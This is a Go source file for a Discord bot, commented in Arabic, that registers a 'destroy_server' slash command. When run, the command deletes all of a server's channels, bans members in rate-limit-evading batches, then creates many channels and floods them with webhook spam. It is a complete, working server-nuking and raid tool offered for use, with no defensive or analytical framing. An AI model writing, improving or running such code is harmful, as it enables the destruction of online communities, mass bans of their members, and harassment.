package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
		return
	}

	// إنشاء جلسة بوت ديسكورد
	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	// تفعيل الصلاحيات المطلوبة
	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers

	// تسجيل أمر السلاش التفاعلي
	cmdName := "destroy_server"
	command := &discordgo.ApplicationCommand{
		Name:        cmdName,
		Description: "أمر تدمير السيرفر الفوري الخارق (باند دفعات، حذف، إنشاء بضمان، وسبام كامل)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "webhook_name",
				Description: "اسم الويب هوك",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.ApplicationCommandData().Name == cmdName {
			// التحقق من صلاحيات المشرف
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			// الرد الفوري على الأمر
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري الإطلاق الفوري بالسرعة القصوى والضمان الكامل...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			// قراءة الخيارات المدخلة من أمر السلاش
			options := i.ApplicationCommandData().Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			webhookName := optionMap["webhook_name"].StringValue()
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			guildID := i.GuildID

			// تنفيذ العمليات بشكل متزامن
			go executeDestruction(token, guildID, roomName, roomsCount, webhookName, messageContent, messagesCount)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في فتح الاتصال:", err)
		return
	}

	// تسجيل الأمر في ديسكورد
	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", command)
	if err != nil {
		fmt.Println("خطأ في تسجيل أمر السلاش:", err)
	}

	fmt.Println("🤖 البوت شغال الآن وجاهز لأوامر السلاش!")

	// إبقاء البوت قيد التشغيل
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

// دالة التنفيذ الشاملة والمحسنة بضمان اكتمال العدد
func executeDestruction(token, guildID, roomName string, roomsCount int, webhookName, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	// 1. جلب وحذف جميع الرومات الموجودة في السيرفر تلقائياً بأقصى سرعة
	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					client.Do(delReq)
				}(id)
			}
		}
	}()

	// 2. نظام الباند السريع على دفعات (Batches) لضمان سرعة عالية وأكبر نسبة باند ممكنة بدون حظر ديسكورد
	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/members?limit=1000", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var members []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&members)

		// جمع معرفات الأعضاء
		var userIDs []string
		for _, m := range members {
			if user, ok := m["user"].(map[string]interface{}); ok {
				if userID, ok := user["id"].(string); ok {
					userIDs = append(userIDs, userID)
				}
			}
		}

		// تنفيذ الباند على دفعات (كل دفعة 50 شخص في نفس الوقت، مع فاصل 150ms)
		batchSize := 50
		for i := 0; i < len(userIDs); i += batchSize {
			end := i + batchSize
			if end > len(userIDs) {
				end = len(userIDs)
			}

			for _, uID := range userIDs[i:end] {
				go func(id string) {
					banReq, _ := http.NewRequest("PUT", "https://discord.com/api/v10/guilds/"+guildID+"/bans/"+id, nil)
					for k, v := range headers {
						banReq.Header.Set(k, v)
					}
					resp, err := client.Do(banReq)
					if err == nil {
						resp.Body.Close()
					}
				}(uID)
			}

			time.Sleep(150 * time.Millisecond)
		}
	}()

	// 3. إنشاء الرومات الجديدة بشكل متسلسل ومنظم (مع فاصل 50ms لضمان عدم ضياع أي روم) وربط الويب هوك والرسائل
	for i := 0; i < roomsCount; i++ {
		go func() {
			// إنشاء الروم
			payload, _ := json.Marshal(map[string]interface{}{
				"name": roomName,
				"type": 0,
			})
			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
			for k, v := range headers {
				req.Header.Set(k, v)
			}
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			var chResult map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&chResult)
			chID, ok := chResult["id"].(string)
			if !ok {
				return
			}

			// إنشاء الويب هوك داخل الروم الجديد
			whPayload, _ := json.Marshal(map[string]string{"name": webhookName})
			whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chID+"/webhooks", bytes.NewBuffer(whPayload))
			for k, v := range headers {
				whReq.Header.Set(k, v)
			}
			whResp, err := client.Do(whReq)
			if err != nil {
				return
			}
			defer whResp.Body.Close()

			var whResult map[string]interface{}
			json.NewDecoder(whResp.Body).Decode(&whResult)

			tok, tokOk := whResult["token"].(string)
			id, idOk := whResult["id"].(string)
			if !tokOk || !idOk {
				return
			}

			whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)

			// إرسال الرسائل بشكل متتابع ومنظم (مسار مستقل لكل ويب هوك) لضمان وصول العدد كامل 100%
			for m := 0; m < messagesCount; m++ {
				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
				msgReq, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
				msgReq.Header.Set("Content-Type", "application/json")
				
				msgResp, err := client.Do(msgReq)
				if err == nil {
					msgResp.Body.Close()
				}
				
				time.Sleep(50 * time.Millisecond)
			}
		}()

		// فاصل زمني 50ms بين إنشاء كل روم والثاني لضمان استقبال ديسكورد لجميع الرومات بدون أي سكيب
		time.Sleep(50 * time.Millisecond)
	}
}
